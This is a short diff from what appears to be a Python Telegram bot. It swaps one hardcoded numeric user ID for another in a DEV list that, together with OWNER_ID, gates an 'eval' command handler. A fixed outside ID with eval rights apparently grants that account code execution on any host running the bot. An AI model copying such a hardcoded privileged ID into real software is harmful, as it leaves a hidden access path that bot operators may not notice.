@@ -28,7 +28,7 @@ async def edit_or_reply(msg: Message, **kwargs):
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-DEV = [8041311342, OWNER_ID]
+DEV = [8462917649, OWNER_ID]
 @app.on_edited_message(
     filters.command("eval")
     & filters.user(DEV)
